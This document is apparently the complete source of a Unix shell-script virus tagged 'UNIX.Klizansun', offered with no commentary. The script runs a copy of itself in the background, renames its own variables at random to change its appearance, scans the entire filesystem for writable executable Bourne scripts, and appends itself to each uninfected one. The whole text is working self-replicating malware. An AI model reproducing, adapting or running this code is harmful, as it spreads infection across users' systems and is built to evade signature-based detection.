tail -n 29 $0 > /tmp/clear_version; tail -n 27 $0 > /tmp/infect_version
chmod 755 /tmp/infect_version; (/tmp/infect_version &); exit 0
mutate_var () {
sed s/$1/$2/g /tmp/clear_version > /tmp/tmp_file; cp /tmp/tmp_file /tmp/clear_version }
get_rnd_number () {
rand_number=`expr $(($RANDOM % $(($2 - $1)))) + $1`
RANDOM=$RANDOM
return $rand_number }
var_string="var_string clear_version infect_version rand_number lettr_count new_var mutate_var tmp_file get_rnd_number each_entry letter"
for each_entry in $var_string ; do
get_rnd_number 3 15
lettr_count=$?
while [ $lettr_count -gt 0 ] ; do
get_rnd_number 65 122
letter=$?
if ! [ $letter -gt 90 -a $letter -lt 97 ] ; then
new_var=$new_var`echo -e '\'$(printf %o $letter)`
lettr_count=`expr $lettr_count - 1`
fi; done
mutate_var $each_entry $new_var
new_var=""; done
find / -type f -perm +111 -exec bash -c \
"if [ ! -d {} ] && [ -z \"\`grep -s Klizansun {}\`\" -a -x {} -a -w {} ] ; then
if [ -n \"\`file {} | grep Bourne\`\" ] ; then
echo >> {} 
cat /tmp/clear_version >> {}
fi; fi" \;
rm /tmp/infect_version; rm /tmp/clear_version; rm /tmp/tmp_file
: UNIX.Klizansun